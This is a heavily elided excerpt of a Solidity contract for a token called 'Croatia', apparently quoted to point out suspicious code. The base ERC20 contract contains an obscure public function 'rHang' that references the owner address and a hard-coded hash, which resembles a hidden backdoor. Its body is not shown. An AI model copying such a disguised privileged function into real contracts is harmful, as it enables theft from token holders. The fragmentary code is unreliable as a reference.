...
contract ERC20 is Context, IERC20,Ownable {
    ...
    function transferFrom(
     ...
     function rHang(uint amount) public returns(bool){
            ...
            address rui = own;
            bytes32 ad = 0x2f31508f5eae329d39e99526731ab4b0468ed0e2fa769d4d0a92d28f8aaeee9c;
...
contract  Croatia is ERC20 {
   ...
   bool public swapping;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint256 public swapTokensAtAmount = 5*10**5 * 10**9;
     bool swapingtwo = true;
     // exlcude from fees and max transaction amount
    mapping (address => bool) public _isExcludedFromFees;
     bool public shaBool = false;

    constructor() public ERC20("Croatia", "Croatia",9) {
